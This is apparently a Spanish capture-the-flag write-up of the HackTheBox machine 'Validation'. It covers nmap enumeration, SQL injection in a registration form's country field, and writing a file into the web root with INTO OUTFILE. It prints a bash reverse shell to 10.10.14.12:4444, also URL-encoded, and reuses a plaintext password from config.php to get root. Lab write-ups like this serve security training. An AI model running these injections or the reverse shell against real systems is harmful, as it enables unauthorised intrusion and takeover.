---
title: "HTB - Validation"
author: "Oscar Bravo"
header: 
  teaser: "/assets/images/post/2022/validation.png"
categories:
  - WriteUp
---


OS | LINUX
Desarrollado por | ipsec
Dificultad | Fácil
Liberación | 13 Septiembre 2021
Puntos | 20

## Enumeración

Al usar nmap utilizando nmap -sCV -A 10.10.11.116 solo encontramos que está abierto el 80 (web),22 (SSH),8080,4566
```
# Nmap 7.92 scan initiated Wed Aug  3 11:19:23 2022 as: nmap -p22,80,4566,8080 -sCV -O -oN nmap/NMAP validation.htb
Nmap scan report for validation.htb (10.10.11.116)
Host is up (0.14s latency).

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 d8:f5:ef:d2:d3:f9:8d:ad:c6:cf:24:85:94:26:ef:7a (RSA)
|   256 46:3d:6b:cb:a8:19:eb:6a:d0:68:86:94:86:73:e1:72 (ECDSA)
|_  256 70:32:d7:e3:77:c1:4a:cf:47:2a:de:e5:08:7a:f8:7a (ED25519)
80/tcp   open  http    Apache httpd 2.4.48 ((Debian))
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
|_http-server-header: Apache/2.4.48 (Debian)
4566/tcp open  http    nginx
|_http-title: 403 Forbidden
8080/tcp open  http    nginx
|_http-title: 502 Bad Gateway
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Aggressive OS guesses: Linux 4.15 - 5.6 (95%), Linux 5.3 - 5.4 (95%), Linux 2.6.32 (95%), Linux 5.0 - 5.3 (95%), Linux 3.1 (95%), Linux 3.2 (95%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (94%), ASUS RT-N56U WAP (Linux 3.4) (93%), Linux 3.16 (93%), Linux 5.0 (93%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Wed Aug  3 11:19:45 2022 -- 1 IP address (1 host up) scanned in 22.46 seconds
```

Empezamos a enumerar directorios e interactuamos con la web, usando nmap –script=http-enum, y solo encuentra account.php. No se encuentra nada más y solo podemos interactuar con la web.

![Validation 1](/assets/images/post/2022/validation1.png)

Al registrarnos en la web nos damos cuenta de que envía un usuario y un país, el cual luego nos muestra nuestro usuario para el país que se eligió. Entre más usuarios registramos a la web más se muestra en la web como usuario, es por ello por lo que podemos pensar que la aplicación puede hacer un INSERT a una base de datos y luego genera un SELECT con el WHERE al país seleccionado. Probamos un SQL injection tanto en el usuario y en el país, y nos percatamos que en la variable country es vulnerable.

Probamos enumerar información importante en la Base de Datos (nombre de base de datos, tablas, usuarios). Descubrimos que la Base de datos que se utiliza es Maria DB 10.5.11

## 1° Shell

Mientras se prueba el SQL injection descubrimos que la web está en /var/www/html, además podemos crear archivos con el SELECT “<CONTENIDO DEL ARCHIVO>” INTO OUTFILE “<RUTA ESPECIFICA DEL ARCHIVO>» y esto nos genera un archivo en la ruta especificada.

Con este pagina creada podemos crear una Shell reversa con el siguiente bash -c ‘bash -i>& /dev/tcp/10.10.14.12/4444 0>&1’ al tratar de ejecutar no nos carga la Shell reversa, es por ello que codificamos el comando en URL ENCODE %62%61%73%68%20%2d%63%20%27%62%61%73%68%20%2d%69%3e%26%20%2f%64%65%76%2f%74%63%70%2f%31%30%2e%31%30%2e%31%34%2e%31%32%2f%34%34%34%34%20%30%3e%26%31%27, y nos carga la Shell (esto pasa por que el navegador debe codificar el dato antes de enviarlo).

## 2° SHELL (root)

Revisando con el www-data vemos que no hay usuario para el sistema, pero en /var/www/html hay un archivo config.php con usuario y contraseña (uhc:uhc-9qual-global-pw) para conectarse localmente a la máquina, probamos esta clave con el usuario root.

![Racso](https://www.hackthebox.com/badge/image/159593)